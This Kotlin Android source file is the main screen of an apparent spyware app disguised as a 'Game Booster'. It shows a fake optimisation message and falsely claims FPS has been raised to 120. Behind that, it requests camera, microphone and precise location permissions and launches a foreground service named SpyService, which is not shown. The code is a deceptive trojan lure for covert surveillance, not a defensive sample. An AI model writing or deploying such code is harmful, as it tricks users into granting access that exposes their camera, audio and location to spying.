package com.ratnik.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Создаем заглушку
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.gravity = Gravity.CENTER
        layout.setBackgroundColor(0xFF1E1E1E.toInt())

        val title = TextView(this)
        title.text = "Game Booster"
        title.setTextColor(0xFFFFFFFF.toInt())
        title.textSize = 28f
        title.gravity = Gravity.CENTER
        layout.addView(title)

        val status = TextView(this)
        status.text = "Оптимизация памяти..."
        status.setTextColor(0xFF00FF00.toInt())
        status.textSize = 16f
        status.setPadding(0, 30, 0, 50)
        status.gravity = Gravity.CENTER
        layout.addView(status)

        val btn = Button(this)
        btn.text = "УСКОРИТЬ FPS"
        btn.setOnClickListener {
            status.text = "FPS увеличен до 120!"
            // При нажатии проверяем разрешения и запускаем сервис
            checkPermissionsAndStart()
        }
        layout.addView(btn)

        setContentView(layout)
    }

    private fun checkPermissionsAndStart() {
        val perms = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missing = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 101)
        } else {
            startSpyService()
        }
    }

    private fun startSpyService() {
        val intent = Intent(this, SpyService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        // После того как пользователь нажал "Разрешить", запускаем сервис
        if (requestCode == 101) {
            startSpyService()
        }
    }
}
